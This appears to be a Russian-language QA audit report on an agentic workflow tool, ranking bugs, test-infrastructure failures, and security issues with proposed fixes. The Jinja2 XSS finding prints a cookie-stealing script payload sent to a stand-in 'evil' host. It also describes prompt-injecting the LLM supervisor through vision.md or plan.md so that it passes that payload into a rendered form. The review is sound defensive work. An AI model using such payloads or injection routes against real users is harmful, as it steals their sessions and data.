# QA Roundtable: agentic-workflow — 2026-08-10

## TL;DR

**Состояние качества: среднее.** Логика core устойчивая (нет shell=True, все yaml.safe_load, atomic writes, HTTP только 127.0.0.1), но есть **3 подтверждённых P0** и слабая test infrastructure.

- **Baseline:** ~1149 тестов (726 unit + 331 plugin + 76 integration + 16 e2e). Lint чистый.
- **Coverage:** awf **52%**, plugin **77%** (на части тестов — полный прогон unit виснет).
- **Graph:** 2631 узлов / 12169 рёбер, индекс свежий.
- **P0 root cause зависания тестов:** `tests/unit/test_api.py:900` спавнит реальный background-pipeline subprocess, не перехватываемый autouse-фикстурой `tests/conftest.py:27` (патчит только `subprocess.run`, не `subprocess.Popen`).
- **Контрибуция ролей:** Bug Hunter 23, Edge Case 50+, Test Coverage 30, Security 13 (Integration & Contract не отработал — пустой ответ, аудит продолжен с 4 ролями).

## Roundtable Insights

**Ключевые консенсусы:**
- **Jinja2 autoescape OFF для всех шаблонов через `env.from_string(body)`** — независимо подтверждено Edge Case (P1) + Security (P0). Скептик повысил до P0 (реально exploitable через LLM-controlled данные в шаблонах: `{{ v.title }}`, `{{ v.description }}`, `{{ p }}`, `{{ c }}` в `increment-planning.html.j2`).
- **CSRF bypass** в `http_endpoint.py:94` — подтверждено Bug Hunter (P2) + Security (P1). Скептик → P1.
- **OPENCODE_CONFIG_CONTENT утечка** — Bug Hunter упомянул OPENCODE_SERVER_TOKEN, Security явно классифицировал утечку API keys/providers. Cross-validated, P1.

**Module-level системные риски (Сигналы от Скептика):**
1. **`awf/api/` — слабое покрытие публичного API под MCP.** 5 модулей с coverage <40%: `wait_event.py` (22%), `_stack.py` (27%), `context.py` (34%), `setup.py` (39%), `dashboard.py` (63%). Это публичная поверхность, которую LLM-агенты реально вызывают.
2. **`subprocess` spawning — недисциплинированный.** 5+ мест без `timeout` (git diff, git log в `agent_stage.py`, `git_utils.py:_git`, `api/context.py:353`, `api/lifecycle.py:466`). На больших репозиториях или NFS могут зависнуть.
3. **Test infrastructure — root cause зависания найден.** Полный прогон `pytest tests/unit/` нестабилен (см. P0 ниже).
4. **HTML rendering security posture слабый** — XSS + CSRF + нет file permissions на `.agentic/inputs/`.
5. **YAML parsing — нет защиты на верхнем уровне.** `config.py:15`, `pipeline.py:88`, `supervisor.py:74` — `yaml.safe_load()` без try/except. Повреждённый config.yaml = краш всего awf.

---

## P0 — критические (fix immediately)

### 1. **[CRITICAL] Python 3.10+ syntax, но `requires-python = ">=3.9"`** — `pyproject.toml:10`

Код массово использует `str | Path`, `list[str]`, `tuple[str | None, ...]`, `dict[str, Any] | None` (PEP 604 union types, появились в 3.10). Примеры:
- `awf/todos.py:68,84,159`
- `awf/git_utils.py:19,24,29,34,40,49,75`
- `awf/api/context.py:32,80,99,117,189,209,277`
- `awf/api/_background.py:36,37,45,46,99`
- `awf/api/wait_event.py:61,118`
- `awf/api/roles.py:127`
- `awf/_env.py:32`

**Воспроизведение:** `pip install python==3.9.19 && pip install -e . && awf init` → `SyntaxError: invalid syntax` при импорте модулей.

**Эффект:** пакет не устанавливается на Python 3.9, хотя pyproject.toml заявляет поддержку. Влияние на существующих пользователей — они на 3.10+, но это нарушение контракта упаковки.

**Фикс:** либо `requires-python = ">=3.10"` (рекомендуется, проще), либо рефакторинг на `Optional[str]`/`Union[str, Path]` из typing (более трудоёмко).

### 2. **[CRITICAL] Jinja2 XSS через `env.from_string(body)`** — `agent_workflow_ui/src/agent_workflow_ui/render/engine.py:66` (подтверждено 2 ролями)

`create_env()` настраивает `autoescape=select_autoescape(["html", "htm", "html.j2"])`. **Но** `render_template()` вызывает `env.from_string(body)` без `name=` аргумента, поэтому autoescape **OFF для всех шаблонов** (jinja2 включает escape только если угадает HTML-расширение по имени).

LLM-controlled данные рендерятся напрямую без экранирования в `default_templates/`:
- `increment-planning.html.j2:170,181,182,184,189,195,205,211` — `{{ v.title }}`, `{{ v.description }}`, `{{ p }}` (pros), `{{ c }}` (cons), `{{ v.estimated_time }}`, `{{ inc.name }}`, `{{ inc.goal }}`
- `project-setup.html.j2:381,433` — `{{ sv.title }}`, `{{ role.title }}`, `{{ role.get('description', '') }}`
- `ack.html.j2:22` — `{{ message }}`

**Сценарий атаки:** supervisor (LLM) передаёт `data={"variants": [{"id": "A", "title": "<script>fetch('//evil/?c='+document.cookie)</script>", ...}]}` через `awf_open_increment_planning_form`. Форма рендерится, скрипт выполняется в браузере пользователя.

**Эффект:** stored XSS через LLM-controlled context. Поскольку LLM получает данные из vision.md / plan.md / пользовательских сообщений, атака возможна через инъекцию в любой из этих источников.

**Фикс:** заменить `env.from_string(body)` на `env.from_string(body, template=<filename>)` ИЛИ захардкодить `Environment(autoescape=True, ...)`. Первый вариант лучше.

### 3. **[CRITICAL] Полный прогон `pytest tests/unit/` зависает** — root cause: `tests/unit/test_api.py:900-910` (подтверждено 2 ролями + Скептик)

- `tests/conftest.py:27-56` autouse-фикстура `_isolate_xdg_env` monkeypatch'ит **`subprocess.run`** для перехвата `opencode models`.
- Но `api.start_pipeline(background=True)` внутри `_background.py:70` использует **`subprocess.Popen(start_new_session=True)`** напрямую — мимо перехвата.
- `test_background_works_with_active_todo` (line 900) спавнит реальный detached pipeline subprocess (с реальным orchestrator, реальным `.agentic/state/`, реальными signal watch).

**Воспроизведение:**
```bash
timeout 60 python3 -m pytest tests/unit/test_api.py --timeout=10 --timeout-method=thread -q
# виснет после ~40% прогресса
```

Pipeline subprocess держит `.agentic/state/` lock, следующие тесты блокируются на чтении/записи state. Неубитый subprocess продолжает работать в фоне, иногда завершается через SIGTERM при выходе pytest (если повезёт).

**Эффект:**
- Невозможно запустить полный unit suite локально (CI наверняка тоже виснет, если он есть).
- Coverage-репорты некорректны (нельзя снять `pytest --cov` на полном наборе).
- Разработчик должен знать, какие подмножества файлов проходят вместе — неявный knowledge.

**Фикс:**
1. Monkeypatch **`subprocess.Popen`** в фикстуре (а не только `subprocess.run`).
2. Или в `test_api.py:900` явно мокать `start_in_background`/`_is_pipeline_running`.
3. Или добавить `@pytest.mark.skip(reason="spawns real subprocess")` + переписать на мок.

---

## P1 — серьёзные (this sprint)

### Security

- **[HIGH] OPENCODE_CONFIG_CONTENT утечка API keys** — `awf/_env.py:75-78` (подтверждено 2 ролями). Читает user's `opencode.json`, мерджит permission overrides, сериализует в env var для всех worker subprocesses. Если в config есть `providers.openai.api_key`, `providers.anthropic.api_token` — они становятся видимы через `os.environ["OPENCODE_CONFIG_CONTENT"]` в любом worker/skill/tool. Guard на >100KB не помогает для типичных конфигов. **Атака:** malicious skill/tool читает env → exfiltration. **Фикс:** whitelist полей (только `permission`), ничего больше.

- **[HIGH] CSRF bypass** — `agent_workflow_ui/src/agent_workflow_ui/http_endpoint.py:94` (подтверждено 2 ролями). `return True  # no Origin, no Referer — backward compat for curl`. Любой локальный процесс (browser extension, malicious web app на localhost) может POST'ить на `/submit/<form_id>`. Origin "null" тоже проходит (sandboxed iframe). form_id — `FORM-NNNN`, виден в network tab. **Фикс:** CSRF-токен в форме + валидация на POST; или mandatory Origin header (curl может `--header "Origin: ..."`).

- **[HIGH] `.agentic/inputs/*.yaml` — нет chmod** — `agent_workflow_ui/src/agent_workflow_ui/http_endpoint.py:198-200`. Form submit data (project-setup может содержать API tokens в custom fields) пишется с default umask (часто world-readable на shared-машинах/CI). **Фикс:** `os.chmod(target, 0o600)` после `_atomic_write_yaml`.

### Subprocess / State machine

- **[HIGH] Signal watch盲区: REVIEW-APPROVED/REVIEW-REJECTED/TEST-PASSED/TEST-FAILED не отслеживаются** — `awf/agent_stage.py:103-110`. `watch_paths` включает только `DONE-*` и `BLOCKED-*` glob'ы, но `expected_signal_prefixes("execute")` возвращает 6 типов. Если worker создаёт `REVIEW-APPROVED-TODO-0001.ready`, pipeline работает впустую до hard_timeout (1 час). **Фикс:** расширить watch_paths до всех expected prefixes.

- **[HIGH] TODO архивируется без проверки commit success** — `awf/pipeline_engine.py:409-416`. `_maybe_commit` возвращает `None` (без success/failure), `archive_todo` вызывается безусловно. Если pre-commit hook упал или git user не сконфигурирован — TODO перемещён в `done/`, изменения остались в working tree без привязки к задаче. **Фикс:** возвращать bool из `_maybe_commit`, при failure — оставлять TODO в inbox + BLOCKED signal.

- **[HIGH] "submitting" формы застревают навсегда при краше** — `agent_workflow_ui/src/agent_workflow_ui/state.py:176-178`. `list_pending()` фильтрует только `status == "pending"`. Если процесс упал между `claim_for_submit` (→"submitting") и `finalize_submit` (→"submitted"), форма застревает: `list_pending` её не видит, TTL-чеки в `read_submit`/`list_pending_forms` проверяют только "pending". Нет recovery. **Фикс:** TTL для "submitting" (например, 10 минут) + auto-revert на "pending".

### YAML parsing

- **[HIGH] yaml.safe_load без try/except в config.py:15** — malformed config.yaml = краш всего awf. `config.load()` вызывается из 20+ мест. `pipeline_state.read_state` имеет защиту, но `config.load` — нет. **Фикс:** wrap в try/except + дружелюбное сообщение.

- **[HIGH] yaml.safe_load без try/except в pipeline.py:88** (`load_stages`) — malformed pipeline.yaml = краш `execute_agent_stage`, `generate_dashboard`. Скептик понизил с P0 (Edge Case дал P0): нет user-facing data loss, но pipeline падает. **Фикс:** try/except с понятной ошибкой.

### Test infrastructure

- **[HIGH] `tests/conftest.py:27-56` autouse `_isolate_xdg_env` патчит subprocess.run на каждый тест** — root cause зависания. Любой тест, тоже патчащий subprocess.run (test_model_check.py:37,156,168,187; test_new_modules.py:161,178; test_audit_followup.py:148) создаёт хрупкую цепочку undo/redo. **Фикс:** патчить `subprocess.Popen` дополнительно.

- **[HIGH] `threading.Thread(daemon=True)` без cleanup** — `tests/unit/test_signals.py:246-259`, `tests/integration/test_plan_checkpoint.py:279,319,391` (3 места). Daemon-потоки не гарантируют завершение; при падении теста поток остаётся, мутирует FS следующих тестов. **Фикс:** явный `thread.join(timeout=...)` в teardown.

- **[HIGH] Entry points plugin без coverage:** `agent_workflow_ui/src/agent_workflow_ui/__main__.py` (0%, 40 строк, MCP server entry), `agent_workflow_ui/src/agent_workflow_ui/skill_installer.py` (0%, 36 строк).

### Edge cases

- **[HIGH] Frontmatter regex greedy/lazy** — `agent_workflow_ui/src/agent_workflow_ui/render/frontmatter.py:33`. `^---\s*\n(.*?)\n---\s*\n(.*)$` с `re.DOTALL`. Если template body содержит `---` (например, `<hr>` в markdown-вставке), regex захватит лишнее. **Фикс:** сделать regex non-greedy на закрывающий `---` или anchor'ить на "start of line".

- **[HIGH] HTTP unicode в form_id** — `agent_workflow_ui/src/agent_workflow_ui/http_endpoint.py:49-58`. `_is_valid_form_id` не проверяет ASCII-only. form_id с unicode создаёт файлы с unicode-именами в `inputs_dir`. Низкий практический риск (form_id генерируется сервером), но нарушает контракт. **Фикс:** `form_id.isascii()` check.

- **[HIGH] PID reuse TOCTOU** — `awf/api/pipeline.py:58-65`. Между `os.kill(pid, 0)` и чтением `/proc/<pid>/cmdline` PID может быть переиспользован. Скептик понижает с P1 (Edge Case) до P2 для типичного использования — но на загруженной системе реален. Эффект: awf_kill может убить не тот процесс.

---

## P2 — качество и риски (backlog)

### Coverage критических путей (5 module-level signals)

- `awf/verify.py` — **14%** (96 строк, критический путь verify stage). Тесты на тривиальные пути, не покрыто: parsing exit codes, partial failure, timeout, missing test_cmd.
- `awf/plan_checkpoint.py` — **21%** (201 строка, BD-36 checkpoint). Не покрыто: form rendering, HTTP endpoint, approval signal handling, timeout recovery.
- `awf/api/wait_event.py` — **22%** (49 строк, supervisor wake-up MCP). Не покрыто: event detection, timeout, state snapshot.
- `awf/api/_stack.py` — **27%** (stack auto-detection). Не покрыто: heuristic detection, fallback.
- `awf/api/context.py` (load_supervisor_context) — **34%**. Самый частый MCP call. Не покрыто: vision excerpt, plan parsing, pipeline state enrichment.
- `awf/api/setup.py` (apply_project_setup) — **39%**. Form submit materialization. Не покрыто: pipeline stage building, role mapping, model preservation.

### Coverage entry points

- `awf/cmd_init.py` — 0% (140 строк). Покрыт косвенно через e2e (`tests/e2e/test_init.py`), но unit-тестов нет.
- `awf/cmd_analyze_roles.py`, `awf/cmd_approve.py` — 0%.
- `awf/cmd_status.py` — 10%.

### Subprocess без timeout (паттерн, 5+ мест)

- `awf/git_utils.py:10` — `_git()` без timeout (git на NFS mount может зависнуть).
- `awf/agent_stage.py:203` — `git diff` (есть timeout=10, OK).
- `awf/agent_stage.py:217` — `git log` (timeout=5, OK).
- `awf/api/context.py:353` — `git diff --stat` без timeout (very large repo → блокирует load_supervisor_context).
- `awf/api/lifecycle.py:466` — `git diff --stat` без timeout в `get_report()`.
- `awf/api/dashboard.py:323` — `ps --ppid` без timeout.

### Quality (логические / API contracts)

- **[MEDIUM] `awf/orchestrator.py:66` — `os.environ["AWF_SUPERVISOR_TIMEOUT"]` set без очистки.** В foreground-режиме утекает в subsequent subprocess'ы того же процесса.
- **[MEDIUM] `awf/pipeline_state.py:118` — Disk I/O внутри lock** в `add()`, `update_status()`, `claim_for_submit()`. YAML serialize + disk write блокирует ThreadingHTTPServer thread pool при высокой нагрузке.
- **[MEDIUM] `agent_workflow_ui/src/agent_workflow_ui/tools/forms.py:111` — Shallow copy `data`**. Вложенные mutable объекты (list, dict) shared между caller и template context. Если LLM мутирует `data["roles"][0]["description"]` после `open_form`, изменится и template.
- **[MEDIUM] `awf/pipeline_engine.py:373-379` — Fall-through после `s_kind == "plan"` к `s_kind == "verify"`** без явного return. Сейчас безопасно, но если добавить новый kind между — выполнится в том же цикле без intent.
- **[MEDIUM] `awf/agent_stage.py:264-270` — Handoff resolution по mtime**. При rapid retry (та же секунда) mtime одинаковый → nondeterministic order. Worker может получить stale handoff.
- **[MEDIUM] `awf/plan_checkpoint.py:161-175` — TOCTOU port race**. Между `_find_free_port()` и `bind()` окно. Retry с 0.5s sleep помогает, но не гарантирует.

### Quality (file I/O / state)

- **[MEDIUM] `agent_workflow_ui/src/agent_workflow_ui/state.py:74-101` — `_load_persisted` не фильтрует expired/submitted формы.** Memory footprint растёт с рестартами. Скептик понижает с P2 до P3 для pet-проекта.
- **[MEDIUM] `awf/signal_watch.py:149` — Worker log file без chmod** (подтверждено 2 ролями). Логи могут содержать sensitive subprocess output, читаются всеми local users.
- **[MEDIUM] `awf/todos.py:148-153` — `dest.rmdir()` может упасть если dir не пуст** (race). Молча проглатывается except, orphan dir остаётся.

### Security дополнения

- **[MEDIUM] `agent_workflow_ui/src/agent_workflow_ui/roles_processor.py:43-50` — `_copy_to_project` без path validation** (в отличие от `_delete_from_project` который имеет `is_relative_to` check). Если GLOBAL_ROLES_DIR содержит symlink с crafted name — write outside `.agentic/roles/`.
- **[MEDIUM] `agent_workflow_ui/src/agent_workflow_ui/tools/forms.py:177` — `template` параметр без whitelist**. LLM может передать любой путь в пределах template dirs, включая не-template файлы. `FileSystemLoader` не даёт escape, но нарушает contract.
- **[MEDIUM] `awf/api/pipeline.py:303` — `todo_id` validation inconsistent.** `rollback()` валидирует regex `^TODO-\d{4,}$`, но `create_baseline()` и `approve_commit()` принимают любую строку.

### Test quality

- **[MEDIUM] `tests/unit/test_audit_followup.py:166-222` — `TestH4ToctouClaim`:** 4 теста на `FormRegistry.claim_for_submit`, но все с `PERSIST_ENABLED = False` и in-memory registry. Реальный file-based TOCTOU (который тесты якобы проверяют) не тестируется.
- **[MEDIUM] `tests/unit/test_api.py:876-882` — `test_all_result_types_have_as_dict`:** проверяет наличие метода, но не корректность сериализации. Проходит даже если `as_dict()` возвращает `{}`.
- **[MEDIUM] `tests/unit/test_verify.py` — 33 теста, но большинство проверяют "не падает на valid input".** Не покрыто: partial verification failure (test passed, lint failed), timeout handling, non-zero exit codes.
- **[MEDIUM] `tests/integration/` — 76 тестов, но нет full pipeline flow** (init → dispatch_todo → start → verify → commit). Существующие мокают отдельные компоненты.

---

## P3 — minor / nice-to-have (backlog)

- **[LOW] `awf/transitions.py:46-53` — Unknown signal → stop без salvage.** Worker создаёт сигнал с неизвестным prefix → pipeline останавливается без контекста для supervisor.
- **[LOW] `awf/orchestrator.py:61` — `int(cli_timeout)` крашит на non-numeric input** (например, `"1h"`).
- **[LOW] `awf/_background.py:77-89` — Log file handle закрыт до Popen completion** (edge case на некоторых OS).
- **[LOW] `awf/commit_gate.py:36` — `APPROVE_TIMEOUT_SECONDS` evaluated at import time.** Не configurable без restart.
- **[LOW] `awf/_env.py:88` — `OPENCODE_CONFIG_CONTENT` env leak (дублирует P1 _env.py:75, но Bug Hunter отдельно отметил).**
- **[LOW] `awf/signals.py:34` — `_short_id` backward-compat alias, не используется вне файла.**
- **[LOW] `awf/config.py:26` — `get()` возвращает `default` для явно заданного `key: null`** (не различает "ключ = null" vs "ключ не найден").
- **[LOW] `awf/plan_progress.py:39` — regex `\bStep\s+(\d+)\b` может матчить "Step 1" в случайном тексте TODO.**
- **[LOW] `awf/_atomic.py:20` — `os.replace()` не атомарен cross-filesystem** (но `mkstemp(dir=...)` обычно гарантирует тот же FS).
- **[LOW] `awf/api/setup.py:220` — backup перезаписывается каждый вызов** (нет history backups).
- **[LOW] `tests/unit/test_signals.py:179-186` — `test_ready_with_whitespace_only_md_accepted` утверждает incorrect behavior** (whitespace-only .md принимается, хотя empty rejected — противоречие).
- **[LOW] `tests/unit/test_api.py:425-431` — `test_missing_log_file_returns_none_tail` проходит по wrong reason** (log_tail logic не выполняется).
- **[LOW] `tests/unit/test_cmd_baseline.py` — 6 тестов зависят от git binary** (могут падать на системах без git).

---

## Покрытие

- **Критические пути без тестов:**
  - `awf/cmd_init.py` — `awf init` (entry point, частично через e2e, но unit нет).
  - `awf/cmd_status.py` — `awf status` (entry point, 10% coverage).
  - `awf/verify.py:run_verify_commands` — критический путь verify stage (логика exit codes, partial failure).
  - `awf/plan_checkpoint.py:_start_checkpoint_server` — BD-36 checkpoint HTTP server.
  - `awf/api/wait_event.py:wait_for_event` — supervisor wake-up (event detection logic).
  - `awf/api/context.py:load_supervisor_context` — aggregation пользовательских сценариев (видел в README как "one-shot bootstrap").
  - `awf/api/setup.py:apply_project_setup` — materialization form submit → pipeline.yaml, config.yaml, supervisor.md.
  - `agent_workflow_ui/src/agent_workflow_ui/__main__.py` — MCP server entry.

- **Бесполезные тесты:**
  - `tests/unit/test_api.py:876-882` `test_all_result_types_have_as_dict` — проверяет наличие метода, не содержимое.
  - `tests/unit/test_api.py:425-431` `test_missing_log_file_returns_none_tail` — проходит по wrong reason (log_tail logic не выполняется).
  - `tests/unit/test_audit_followup.py:166-222` `TestH4ToctouClaim` — claims to test TOCTOU, but in-memory only.

- **Дублирующие тесты:**
  - `tests/unit/test_new_modules.py:167-183` `test_hard_timeout_raises` и `tests/unit/test_audit_followup.py:129-158` `test_hard_timeout_kills_hung_process` — оба проверяют один путь (`run_subprocess_until_signal` → `TimeoutError`), разные mocks.

- **Уровни:**
  - unit ✓ (но нестабилен при полном прогоне)
  - integration partial (мокает компоненты, нет full pipeline flow)
  - e2e ✓ (16 тестов, через `tests/stubs/opencode`)
  - contract ✗ (нет contract-тестов на awf.api ↔ MCP tools)
  - property ✗ (нет property-based)
  - mutation ✗

- **Разрыв тестируется vs ломается:** тестируется — happy path с валидным input и `tests/stubs/opencode` mock. Ломается — malformed YAML, real opencode behavior, edge cases в form rendering, concurrent pipeline starts, partial failures.

- **Mock fidelity gap:** `tests/stubs/opencode` ведёт себя идеально (быстро, предсказуемо, без interactive prompts). Реальный opencode может: зависать на network call, требовать интерактивного подтверждения, печатать в stderr, менять format output. Многие предположения о поведении opencode закодированы в `agent_stage.py`, `model_check.py`, но не проверяются.

---

## Спорные точки

1. **`awf/verify.py:136-138` "лог перезаписывается"** (Bug Hunter P1) — Скептик отклонил: `log_chunks` накопительный список, `atomic_write_text` пишет полный контент всех команд. Не баг. **Решение: closed.**

2. **`awf/verify.py:99` shlex.split → injection** (Edge Case) — Edge Case сам понизил до P2, Скептик отклонил: без `shell=True` injection не работает, `;` не обрабатывается subprocess. **Решение: closed как non-issue.**

3. **PID reuse race** — Edge Case P1, Скептик понижает до P2 (атака требует rapid PID cycling на загруженной системе, на pet-проекте нереалистично). **Решение: P2 с пометкой.**

4. **`awf/_atomic.py:20` mkstemp OSError** (Edge Case P0) — Скептик понижает до P3 (внешняя ситуация disk full/permission denied, atomic_write_text корректно прокидывает ошибку). **Решение: P3.**

5. **yaml.safe_load без try/except** — Edge Case P0, Скептик понижает до P1 (нет user-facing data loss, но pipeline падает с непонятной ошибкой). **Решение: P1.**

6. **Jinja2 XSS — P0 vs P1** — Security дал P0, Edge Case P1. Скептик повысил до P0: реально exploitable через LLM-controlled данные в шаблонах (`{{ v.title }}` и т.д.), атакующий = любой, кто может записать в vision.md / plan.md / prompt. **Решение: P0.**

7. **cmd_init.py coverage 0%** — Coverage Analyst P0, Скептик понижает до P1 (есть косвенное покрытие через `tests/e2e/test_init.py`). **Решение: P1.**

---

## Вопросы к тебе

1. **Поддержка Python 3.9 — нужна?** Если нет → фиксы P0 #1 тривиальный (`requires-python = ">=3.10"`). Если да → рефакторинг на `Optional[]`/`Union[]`.
2. **Кто контролирует `variants` в `awf_open_increment_planning_form`?** Если только supervisor (LLM) из plan.md / vision.md — XSS реален через инъекцию в эти файлы. Если форма также принимает input от пользователя — выше риск.
3. **Запускаешь ли awf на shared-машинах (CI, командные dev-серверы)?** Если да — `.agentic/inputs/` без chmod 0o600 = leak sensitive данных между пользователями.
4. **`OPENCODE_CONFIG_CONTENT` — есть ли в твоём `opencode.json` провайдеры с API keys?** Если да — это уже эксплойтабельно для любого skill/tool, который может читать env.

---

## Рекомендации следующих шагов

- **P0 #1 (Python 3.9 compat)** — 1-line fix в `pyproject.toml`. Можно сразу коммитить.
- **P0 #2 (Jinja2 XSS)** — `agent-debugger` или ручной fix в `engine.py:66` (1 строка). + audit всех `{{ var }}` в `default_templates/` на необходимость `| e` или autoescape.
- **P0 #3 (test hang)** — `agent-qa-review` на `tests/conftest.py` + `tests/unit/test_api.py:900-910`. Требует понимания, как корректно мокать `subprocess.Popen`.
- **P1 security (OPENCODE_CONFIG_CONTENT, CSRF, chmod)** — `agent-security-auditor` для группы фиксов.
- **P1 YAML parsing** — `agent-debugger` для отдельных мест.
- **P1/P2 coverage критических путей** — `agent-test-automator` для `cmd_init.py`, `verify.py`, `plan_checkpoint.py`, `wait_event.py`, `context.py`, `setup.py`.
- **P2 module-level риски** — backlog.
